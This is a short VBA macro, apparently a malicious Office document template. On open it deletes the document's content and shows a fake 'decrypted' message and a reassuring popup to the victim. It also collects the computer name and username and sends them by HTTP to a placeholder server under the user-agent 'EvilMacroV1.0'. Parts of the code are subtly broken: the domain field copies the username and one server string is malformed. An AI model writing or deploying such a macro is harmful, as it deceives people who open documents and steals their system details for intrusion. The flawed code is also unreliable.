Sub AutoOpen()
    DeleteAndDecrypt
    VBAStealer

End Sub
Sub DeleteAndDecrypt()
'Delete encrypted content after enabling macros
    ActiveDocument.Content.Select
    Selection.Delete
    Selection.InsertBefore Text:="Decrypted content!!!"
    
End Sub
Public Function Exer(url As String)
    With CreateObject("WinHttp.WinHttpRequest.5.1")
        .Open "GET", url, False
        .setRequestHeader "User-Agent", "EvilMacroV1.0"
        .Send
    End With
End Function
Sub VBAStealer()
    Dim hostname As String
    Dim username As String
    Dim domain As String
    hostname = Environ("COMPUTERNAME")
    username = Environ("USERNAME")
    domain = Environ("USERNAME")
    username = username + "/" + domain
    Dim url As String
    Dim Ip As String
    server1 = "<SERVERIP>"
    server2 = "<SERVERIP"
    url = server1 + server2 + "?" + "hostname=" + hostname + "&" + "username=" + username + "&" + "domain=" + domain
    Dim res As String
    res = Exer(url)
    MsgBox("You can now view the file!")

' exfiltrate data using HTTP

End Sub